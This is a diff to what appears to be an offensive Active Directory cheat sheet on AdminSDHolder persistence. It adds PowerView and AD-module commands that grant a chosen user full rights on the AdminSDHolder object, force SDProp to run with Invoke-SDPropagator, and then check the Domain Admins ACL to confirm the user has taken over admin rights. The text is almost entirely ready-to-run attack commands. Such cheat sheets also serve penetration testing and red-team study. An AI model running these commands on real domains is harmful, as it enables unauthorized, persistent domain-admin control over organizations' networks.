@@ -20,11 +20,36 @@
 
     Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=DOMAIN,DC=LOCAL' -PrincipalIdentity spotless -Verbose -Rights All
 
+##### PowerView
+
+    Add-ObjectAcl -TargetSearchBase 'CN=AdminSDHolder,CN=System' -PrincipalIdentity user1 -Rights All -Verbose
+
+##### AD Module
+
+    Set-ADACL -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=domain,DC=local' -Principal user1 -Verbose
+
+Run SDProp manually
+
+    Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose
+
+##### Pre-Server 2008
+
+    Invoke-SDPropagator -taskname FixUpInheritance -timeoutMinutes 1 -showProgress -Verbose
+
+
+OR
+
 Then wait for SDProp process to run. It may take up to 60 minutes. After waiting, run the command below to inspect if the user has been added as a domain admin
 
 ### Inspection
 
     Get-DomainObjectAcl -SamAccountName "AdminSdHolder" -ResolveGUIDs
 
-    Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'Moe'}
+##### PowerView
+
+    Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'user1'}
+
+##### AD Module
+
+    (Get-Acl -Path 'AD:\CN=Domain Admins,CN=Users,DC=domain,DC=local').Access | ?{$_.IdentityReference -match 'user1'}
 
